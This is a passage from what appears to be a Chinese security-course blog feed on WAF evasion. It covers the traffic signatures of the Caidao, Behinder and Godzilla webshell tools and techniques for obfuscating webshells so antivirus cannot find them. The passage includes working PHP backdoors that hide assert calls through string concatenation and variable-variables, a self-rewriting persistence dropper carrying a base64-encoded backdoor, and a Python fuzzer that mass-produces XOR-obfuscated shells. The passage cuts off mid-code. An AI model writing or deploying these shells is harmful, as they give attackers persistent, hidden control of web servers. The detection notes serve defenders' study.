title="网站内置的WAF"></a>网站内置的WAF</h5><p>就是来自网站内部的过滤，直接出现在网站代码中，比如说对输入的参数强制类转换啊，对输入的参数进行敏感词检测啊什么的</p><h5 id="2、如何判断WAF？"><a href="#2、如何判断WAF？" class="headerlink" title="2、如何判断WAF？"></a>2、如何判断WAF？</h5><p>Wafw00f，看图识别，其他项目脚本平台</p><p><a href="https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ">https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ</a></p><h5 id="3、常见WAF拓扑-amp-防护？"><a href="#3、常见WAF拓扑-amp-防护？" class="headerlink" title="3、常见WAF拓扑&amp;防护？"></a>3、常见WAF拓扑&amp;防护？</h5><p>见上图流量走向&amp;常见漏洞</p><h5 id="4、目前有哪些常见WAF产品？"><a href="#4、目前有哪些常见WAF产品？" class="headerlink" title="4、目前有哪些常见WAF产品？"></a>4、目前有哪些常见WAF产品？</h5><p>参考：<a href="https://blog.csdn.net/w2sft/article/details/104533082/">https://blog.csdn.net/w2sft/article/details/104533082/</a></p><p>① 硬件型</p><p>硬件型WAF以一个独立的硬件设备的形态存在，支持以多种方式（如透明桥接模式、旁路模式、反向代理等）部署到网络中为后端的Web应用提供安全防护，是最为传统的WAF型态，在受访企业中部署占比为35.2%。相对于软件产品类的WAF，这类产品的优点是性能好、功能全面、支持多种模式部署等，但它的价格通常比较贵。国内的绿盟、安恒、启明星辰等老牌厂商旗下的WAF都属于此类。</p><p>② 软件型</p><p>这种类型的WAF采用纯软件的方式实现，特点是安装简单，容易使用，成本低。但它的缺点也是显而易见的，除了性能受到限制外，还可能会存在兼容性、安全等问题。这类WAF的代表有ModSecurity、Naxsi、ShareWAF、安全狗等。</p><p>③ 云WAF</p><p>随着云计算技术的快速发展，使得基于云的WAF实现成为可能，在本次调查中占比甚至超过了传统的硬件WAF跃升为第一位，达到39.4%。阿里云、腾讯云、深信服云WAF、Imperva WAF是这类WAF的典型代表。</p><blockquote><p>演示案例：</p><p>​                ➢ 菜刀-流量&amp;绕过&amp;特征&amp;检测</p><p>​                ➢ 冰蝎-流量&amp;绕过&amp;特征&amp;检测</p><p>​                ➢ 哥斯拉-流量&amp;绕过&amp;特征&amp;检测</p></blockquote><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324164525308.png" alt="image-20230324164525308"></p><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324202732453.png" alt="image-20230324202732453"></p><h4 id="菜刀-流量-amp-绕过-amp-特征-amp-检测"><a href="#菜刀-流量-amp-绕过-amp-特征-amp-检测" class="headerlink" title="#菜刀-流量&amp;绕过&amp;特征&amp;检测"></a>#菜刀-流量&amp;绕过&amp;特征&amp;检测</h4><p>proxifier配合burp抓包菜刀上的流量</p><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324174427933.png" alt="image-20230324174427933"></p><h5 id="1、版本"><a href="#1、版本" class="headerlink" title="1、版本"></a>1、版本</h5><p>2014 $_POST&#x3D;$_REQUEST 2016 可以</p><h5 id="2、特征："><a href="#2、特征：" class="headerlink" title="2、特征："></a>2、特征：</h5><p>数据包流量特征：</p><p>1，请求包中：ua头为百度爬虫</p><p>2，请求体中存在eval，base64等特征字符</p><p>3，请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</p><h4 id="冰蝎-流量-amp-绕过-amp-特征-amp-检测"><a href="#冰蝎-流量-amp-绕过-amp-特征-amp-检测" class="headerlink" title="#冰蝎-流量&amp;绕过&amp;特征&amp;检测"></a>#冰蝎-流量&amp;绕过&amp;特征&amp;检测</h4><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324175515181.png" alt="image-20230324175515181"></p><h5 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h5><p>冰蝎利用了服务器端的脚本语言加密功能，通讯的过程中，</p><p>消息体内容采用 AES 加密，基于特征值检测的安全产品无法查出。</p><h5 id="2、通讯"><a href="#2、通讯" class="headerlink" title="2、通讯"></a>2、通讯</h5><p>以代码Key为密匙的AES加密解密过程</p><h5 id="3、特征：（如果以下特征有的同时存在则可能是冰蝎的流量）"><a href="#3、特征：（如果以下特征有的同时存在则可能是冰蝎的流量）" class="headerlink" title="3、特征：（如果以下特征有的同时存在则可能是冰蝎的流量）"></a>3、特征：（如果以下特征有的同时存在则可能是冰蝎的流量）</h5><p>1、User-agent：代码中定义</p><p>2、Pragma: no-cache</p><p>3、Content-Type：application&#x2F;x-www-form-urlencoded</p><p>4、Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</p><p>5、Accept-Encoding: gzip, deflate, br</p><p>6、Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</p><p>采用AES加密，可以观察到经常会有斜杠&#x2F;这种符号，这是不同与base64的地方</p><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324175029304.png" alt="image-20230324175029304"></p><p>冰蝎自带生成的shell里面有默认的key，可能会作为检测的点，但是可以我们自己可以修改</p><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324180026061.png" alt="image-20230324180026061"></p><p>尝试解密上面的数据包内容，输入冰蝎自身的key,iv等</p><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324180323303.png" alt="image-20230324180323303"></p><p>将解码后的base64加密的内容进行解码，冰蝎加密入方向和出方向都进行加密，保证数据包可以顺利进去，又可以顺利出来</p><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324180501320.png" alt="image-20230324180501320"></p><p>可以反编译冰蝎的jar包，分析其特征，如里面的UA头，但是可以修改里面的特征，魔改实现绕过入检测系统</p><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324183111858.png" alt="image-20230324183111858"></p><h4 id="哥斯拉-流量-amp-绕过-amp-特征-amp-检测"><a href="#哥斯拉-流量-amp-绕过-amp-特征-amp-检测" class="headerlink" title="#哥斯拉-流量&amp;绕过&amp;特征&amp;检测"></a>#哥斯拉-流量&amp;绕过&amp;特征&amp;检测</h4><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324202929240.png" alt="image-20230324202929240"></p><p><a href="https://www.freebuf.com/articles/web/257956.html">冰蝎2和3及哥斯拉Godzilla特征分析 - FreeBuf网络安全行业门户</a></p><p>哥斯拉的也是双向流量加密，xor_base64是采用异或运算和base64编码的方式，而且是三层加密，一般的waf捕获不到，只有商业的态势感知才可能捕获到</p><p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/image-20230324194529256.png" alt="image-20230324194529256"></p><h5 id="1、通讯加密见图"><a href="#1、通讯加密见图" class="headerlink" title="1、通讯加密见图"></a>1、通讯加密见图</h5><h5 id="2、特征：-1"><a href="#2、特征：-1" class="headerlink" title="2、特征："></a>2、特征：</h5><p>1、User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko&#x2F;20100101 Firefox&#x2F;84.0</p><p>2、Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</p><p>3、Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</p><p>4、Cookie: PHPSESSID&#x3D;rut2a51prso470jvfe2q502o44;  <strong>cookie最后面存在一个分号”;”</strong></p><p>java网址waf不可能是宝塔和安全狗，因为这些waf不支持这个语言</p>]]></content>
      
      
      <categories>
          
          <category> WAF攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day77 WAF攻防-权限控制&amp;代码免杀&amp;异或运算&amp;变量覆盖&amp;混淆加密&amp;传参</title>
      <link href="/2023/03/23/Day77-WAF%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6-%E4%BB%A3%E7%A0%81%E5%85%8D%E6%9D%80-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86-%E4%BC%A0%E5%8F%82/"/>
      <url>/2023/03/23/Day77-WAF%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6-%E4%BB%A3%E7%A0%81%E5%85%8D%E6%9D%80-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86-%E4%BC%A0%E5%8F%82/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、脚本后门基础&amp;原理</p><p>2、脚本后门查杀绕过机制</p><p>3、权限维持-覆盖&amp;传参&amp;加密&amp;异或等</p><h4 id="代码块-amp-传参数据-amp-工具指纹等-表面-amp-行为"><a href="#代码块-amp-传参数据-amp-工具指纹等-表面-amp-行为" class="headerlink" title="代码块&amp;传参数据&amp;工具指纹等(表面&amp;行为)"></a>代码块&amp;传参数据&amp;工具指纹等(表面&amp;行为)</h4><p>1、代码表面层免杀-ASP&amp;PHP&amp;JSP&amp;ASPX等</p><p>2、工具行为层免杀-菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>WAF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段。</p><h3 id="补充点："><a href="#补充点：" class="headerlink" title="#补充点："></a>#补充点：</h3><h5 id="1、什么是WAF？"><a href="#1、什么是WAF？" class="headerlink" title="1、什么是WAF？"></a>1、什么是WAF？</h5><p>Web Application Firewall（web应用防火墙），一种公认的说法是“web应用防火墙通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为web应用提供保护的一款产品。</p><p>基本可以分为以下4种</p><h5 id="软件型WAF"><a href="#软件型WAF" class="headerlink" title="软件型WAF"></a>软件型WAF</h5><p>以软件的形式安装在服务器上面，可以接触到服务器上的文件，因此就可以检测服务器上是否有webshell，是否有文件被创建等。</p><h5 id="硬件型WAF"><a href="#硬件型WAF" class="headerlink" title="硬件型WAF"></a>硬件型WAF</h5><p>以硬件形式部署在链路中，支持多种部署方式。当串联到链路上时可以拦截恶意流量，在旁路监听模式时只记录攻击但是不进行拦截。</p><h5 id="云-WAF"><a href="#云-WAF" class="headerlink" title="云 WAF"></a>云 WAF</h5><p>一般以反向代理的形式工作，通过配置后，使对网站的请求数据优先经过WAF主机，在WAF主机对数据进行过滤后再传给服务器</p><h5 id="网站内置的WAF"><a href="#网站内置的WAF" class="headerlink" title="网站内置的WAF"></a>网站内置的WAF</h5><p>就是来自网站内部的过滤，直接出现在网站代码中，比如说对输入的参数强制类转换啊，对输入的参数进行敏感词检测啊什么的</p><h5 id="2、如何判断WAF？"><a href="#2、如何判断WAF？" class="headerlink" title="2、如何判断WAF？"></a>2、如何判断WAF？</h5><p>Wafw00f，看图识别，其他项目脚本平台</p><p><a href="https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ">https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ</a></p><h5 id="3、常见WAF拓扑-amp-防护？"><a href="#3、常见WAF拓扑-amp-防护？" class="headerlink" title="3、常见WAF拓扑&amp;防护？"></a>3、常见WAF拓扑&amp;防护？</h5><p>见上图流量走向&amp;常见漏洞</p><h5 id="4、目前有哪些常见WAF产品？"><a href="#4、目前有哪些常见WAF产品？" class="headerlink" title="4、目前有哪些常见WAF产品？"></a>4、目前有哪些常见WAF产品？</h5><p>参考：<a href="https://blog.csdn.net/w2sft/article/details/104533082/">https://blog.csdn.net/w2sft/article/details/104533082/</a></p><p>① 硬件型</p><p>硬件型WAF以一个独立的硬件设备的形态存在，支持以多种方式（如透明桥接模式、旁路模式、反向代理等）部署到网络中为后端的Web应用提供安全防护，是最为传统的WAF型态，在受访企业中部署占比为35.2%。相对于软件产品类的WAF，这类产品的优点是性能好、功能全面、支持多种模式部署等，但它的价格通常比较贵。国内的绿盟、安恒、启明星辰等老牌厂商旗下的WAF都属于此类。</p><p>② 软件型</p><p>这种类型的WAF采用纯软件的方式实现，特点是安装简单，容易使用，成本低。但它的缺点也是显而易见的，除了性能受到限制外，还可能会存在兼容性、安全等问题。这类WAF的代表有ModSecurity、Naxsi、ShareWAF、安全狗等。</p><p>③ 云WAF</p><p>随着云计算技术的快速发展，使得基于云的WAF实现成为可能，在本次调查中占比甚至超过了传统的硬件WAF跃升为第一位，达到39.4%。阿里云、腾讯云、深信服云WAF、Imperva WAF是这类WAF的典型代表。</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ 基础-脚本后门控制原理-代码解释</p><p>​                ➢ 原理-脚本后门查杀机制-函数&amp;行为</p><p>​                ➢ 代码-脚本后门免杀变异-覆盖&amp;传参</p><p>​                ➢ 代码-脚本后门免杀变异-异或&amp;加密</p><p>​                ➢ 拓展-脚本后门脚本类型-JSP&amp;ASPX</p><p><strong><a href="https://blog.csdn.net/weixin_50464560/article/details/117104664">(22条消息) 免杀PHP一句话木马（把阿里云给过了）_php免杀一句话_J0hnson666的博客-CSDN博客</a></strong></p><p>生成666.php的木马，内容为$shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;666.php&#x27;</span>;</span><br><span class="line"><span class="variable">$shell</span> =</span><br><span class="line"><span class="string">&quot;PD9waHAKCSRzdHIxID0gJ2FIKFVVSChmc2RmSChVVUgoZnNkZixmZGdkZWZqZzBKKXImJUYlKl5HKnQnOwoJJHN0cjIgPSBzdHJ0cigkc3RyMSxhcnJheSgnYUgoVVVIKGZzZGZIKFVVSChmc2RmLCc9PidhcycsJ2ZkZ2RlZmpnMEopJz0+J3NlJywnciYlRiUqXkcqdCc9PidydCcpKTsKCSRzdHIzID0gc3RydHIoJHN0cjIsYXJyYXkoJ3MsJz0+J3MnLCdmZGdkZWZqZzBKKXImJUYlKl5HKic9PidlcicpKTsKCWlmKG1kNShAJF9HRVRbJ2EnXSkgPT0nZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2UnKXsKCQkkc3RyNCA9IHN0cnJldigkX1BPU1RbJ2EnXSk7CgkJJHN0cjUgPSBzdHJyZXYoJHN0cjQpOwoJCSRzdHIzKCRzdHI1KTsKICAgIH0KPz4=&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$shell</span>));</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="基础-脚本后门控制原理-代码解释"><a href="#基础-脚本后门控制原理-代码解释" class="headerlink" title="#基础-脚本后门控制原理-代码解释"></a>#基础-脚本后门控制原理-代码解释</h3><p>对比工具代码-菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p><h3 id="原理-脚本后门查杀机制-函数-amp-行为"><a href="#原理-脚本后门查杀机制-函数-amp-行为" class="headerlink" title="#原理-脚本后门查杀机制-函数&amp;行为"></a>#原理-脚本后门查杀机制-函数&amp;行为</h3><p>对比WAF规则-函数匹配&amp;工具指纹等</p><h3 id="代码-脚本后门免杀变异-覆盖-amp-传参"><a href="#代码-脚本后门免杀变异-覆盖-amp-传参" class="headerlink" title="#代码-脚本后门免杀变异-覆盖&amp;传参"></a>#代码-脚本后门免杀变异-覆盖&amp;传参</h3><p>1.php 传参带入</p><p>参数拼接，eval容易被识别，最好采用assert去拼接</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$a</span>.<span class="string">&#x27;ert&#x27;</span>;</span><br><span class="line"><span class="variable">$aa</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?a=ass</span><br><span class="line">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure><h5 id="2-php-变量覆盖"><a href="#2-php-变量覆盖" class="headerlink" title="2.php 变量覆盖"></a>2.php 变量覆盖</h5><p>如：</p><p><img src="/../images/Day77-WAF%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6-%E4%BB%A3%E7%A0%81%E5%85%8D%E6%9D%80-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86-%E4%BC%A0%E5%8F%82/image-20230324142835923.png" alt="image-20230324142835923"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure><h3 id="代码-脚本后门免杀变异-异或-amp-加密"><a href="#代码-脚本后门免杀变异-异或-amp-加密" class="headerlink" title="#代码-脚本后门免杀变异-异或&amp;加密"></a>#代码-脚本后门免杀变异-异或&amp;加密</h3><h5 id="3-php-加密变异"><a href="#3-php-加密变异" class="headerlink" title="3.php 加密变异"></a>3.php 加密变异</h5><p>php文件加密网址，用自定义的加密方式加密的，就像需要密钥才能分析内容，基本可以实现通杀，最稳的方法</p><p><a href="http://www.phpjm.net/">http://www.phpjm.net/</a></p><p><a href="https://www.phpjms.com/">https://www.phpjms.com/</a></p><p><a href="http://1.15.155.76:1234/">http://1.15.155.76:1234/</a></p><h5 id="4-php-异或运算"><a href="#4-php-异或运算" class="headerlink" title="4.php 异或运算"></a>4.php 异或运算</h5><p>参考链接：</p><p><a href="https://blog.csdn.net/qq_43431158/article/details/108035878">(22条消息) 浅析无字符数字构造webshell_无字符webshell_lemonl1的博客-CSDN博客</a></p><p><a href="https://www.freebuf.com/articles/network/279563.html">老生常谈的无字母数字 Webshell 总结 - FreeBuf网络安全行业门户</a></p><p><img src="/../images/Day77-WAF%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6-%E4%BB%A3%E7%A0%81%E5%85%8D%E6%9D%80-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86-%E4%BC%A0%E5%8F%82/image-20230324144101837.png" alt="image-20230324144101837"></p><p>这两个符号异或运算的结果是a<img src="/../images/Day77-WAF%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6-%E4%BB%A3%E7%A0%81%E5%85%8D%E6%9D%80-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86-%E4%BC%A0%E5%8F%82/image-20230324144137073.png" alt="image-20230324144137073"></p><p>写脚本，看看还有哪些符号相互匹配时可以组成，1-127是利用ascii编码</p><p><img src="/../images/Day77-WAF%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6-%E4%BB%A3%E7%A0%81%E5%85%8D%E6%9D%80-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86-%E4%BC%A0%E5%8F%82/image-20230324144338330.png" alt="image-20230324144338330"></p><p>这种通过异或运算的无字符webshell，可以把每个字母，甚至类似$这种符号，都用异或运算表达，最后再拼接，这样的方法也是基本通杀的</p><p><img src="/../images/Day77-WAF%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6-%E4%BB%A3%E7%A0%81%E5%85%8D%E6%9D%80-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86-%E4%BC%A0%E5%8F%82/image-20230324145839173.png" alt="image-20230324145839173"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading,queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string</span>():</span><br><span class="line">​    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">​        filename=q.get()</span><br><span class="line">​        url = <span class="string">&#x27;http://127.0.0.1:8081/x/&#x27;</span> + filename</span><br><span class="line">​        datas = &#123;</span><br><span class="line">​            <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;phpinfo();&#x27;</span></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        result = requests.post(url, data=datas).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">​        <span class="keyword">if</span> <span class="string">&#x27;XIAODI-PC&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">​            <span class="built_in">print</span>(<span class="string">&#x27;check-&gt;&#x27;</span>+filename+<span class="string">&#x27;-&gt;ok&#x27;</span>)</span><br><span class="line">​        <span class="keyword">else</span>:</span><br><span class="line">​            <span class="built_in">print</span>(<span class="string">&#x27;check-&gt;&#x27;</span>+filename+<span class="string">&#x27;-&gt;no&#x27;</span>)</span><br><span class="line">​        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell_test_check</span>():</span><br><span class="line">​    url=<span class="string">&#x27;http://127.0.0.1:8081/x/33xd64.php&#x27;</span></span><br><span class="line">​    datas=&#123;</span><br><span class="line">​        <span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;phpinfo();&#x27;</span></span><br><span class="line">​    &#125;</span><br><span class="line">​    result=requests.post(url,data=datas).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">​    <span class="built_in">print</span>(result)</span><br><span class="line">​    <span class="keyword">if</span> <span class="string">&#x27;XIAODI-PC&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">​    q=queue.Queue()</span><br><span class="line">​    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">127</span>):</span><br><span class="line">​        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">127</span>):</span><br><span class="line">​            payload = <span class="string">&quot;&#x27;&quot;</span> + <span class="built_in">chr</span>(i) + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;^&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="built_in">chr</span>(ii) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">​            code = <span class="string">&quot;&lt;?php $a=(&quot;</span> + payload + <span class="string">&quot;).&#x27;ssert&#x27;;$a($_POST[x]);?&gt;&quot;</span></span><br><span class="line">​            filename = <span class="built_in">str</span>(i) + <span class="string">&#x27;xd&#x27;</span> + <span class="built_in">str</span>(ii) + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line">​            q.put(filename)</span><br><span class="line">​            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:/phpstudy/PHPTutorial/WWW/x/&#x27;</span> + filename, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">​                f.write(code)</span><br><span class="line">​                f.close()</span><br><span class="line">​                <span class="built_in">print</span>(<span class="string">&#x27;Fuzz文件生成成功&#x27;</span>)</span><br><span class="line">​    <span class="keyword">for</span> x <span 